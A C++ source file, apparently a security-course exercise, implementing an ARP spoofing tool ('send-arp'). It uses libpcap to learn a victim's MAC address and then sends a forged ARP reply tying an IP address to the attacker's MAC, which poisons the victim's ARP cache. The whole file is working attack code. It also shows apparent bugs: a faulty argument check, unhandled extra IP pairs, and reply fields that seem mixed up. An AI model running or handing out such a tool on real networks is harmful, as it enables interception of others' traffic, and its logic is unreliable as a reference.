#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/ioctl.h>

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

std::string get_attacker_mac(const char *interface) {
    struct ifreq ifr;
    unsigned char *macAddress;
    std::string result;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return result; // 에러가 발생하면 빈 문자열 반환
    }
    
    macAddress = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    
    // MAC 주소를 문자열로 변환하여 반환
    char macStr[18]; // MAC 주소는 최대 17글자로 표현되며, 마지막에 널 문자를 추가해야 함
    snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
             macAddress[0], macAddress[1], macAddress[2],
             macAddress[3], macAddress[4], macAddress[5]);
    
    close(sock);
    return macStr;
}

std::string arp_request(char* victim_ip, char* attacker_ip, std::string attacker_mac, pcap_t* handle) {
    EthArpPacket packet;
    //request => sender = attacker, target = victim
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Broadcast MAC address
    packet.eth_.smac_ = Mac(attacker_mac.c_str()); // Attacker's MAC address
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(attacker_mac.c_str()); // Sender's MAC address
    packet.arp_.sip_ = htonl(Ip(attacker_ip)); // Sender's IP address
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Victim's MAC address (Unknown)
    packet.arp_.tip_ = htonl(Ip(victim_ip)); // Target's IP address (Supplied as argument)
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) 
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        
        memcpy(&packet, recv_packet, sizeof(EthArpPacket));
        if (packet.eth_.type_ != htons(EthHdr::Arp)) continue;
        if ((uint32_t)packet.arp_.sip_ == htonl(Ip(victim_ip))) {
            //printf("Victim MAC = %s\n", std::string(packet.arp_.smac_).c_str());
            break;
        }
    }
    
    return std::string(packet.arp_.smac_);
}

void arp_reply(char* victim_ip, char* attacker_ip, std::string victim_mac, std::string attacker_mac, pcap_t* handle) {
    EthArpPacket packet;
    //reply => sender = victim, target = attacker
    packet.eth_.dmac_ = Mac(victim_mac.c_str());
    packet.eth_.smac_ = Mac(attacker_mac.c_str()); // Attacker's MAC address
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(victim_mac.c_str()); // Sender's MAC address
    packet.arp_.sip_ = htonl(Ip(victim_ip)); // Sender's IP address
    packet.arp_.tmac_ = Mac(attacker_mac.c_str()); // Victim's MAC address
    packet.arp_.tip_ = htonl(Ip(attacker_ip)); // Target's IP address (Supplied as argument)
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) 
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

void usage() {
    printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if ((argc < 4) && (argc % 2 != 0)) {
        usage();
        return -1;
    }
    
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    const char *interface = argv[1];
    std::string attacker_mac = get_attacker_mac(interface);
    
    printf("Attacker MAC = %s\n", attacker_mac.c_str());
    
    std::string victim_mac = arp_request(argv[2], argv[3], attacker_mac, handle);
    printf("Victim MAC = %s\n", victim_mac.c_str());
    
    arp_reply(argv[2], argv[3], victim_mac, attacker_mac, handle);
    
    pcap_close(handle);
    printf("done");
}
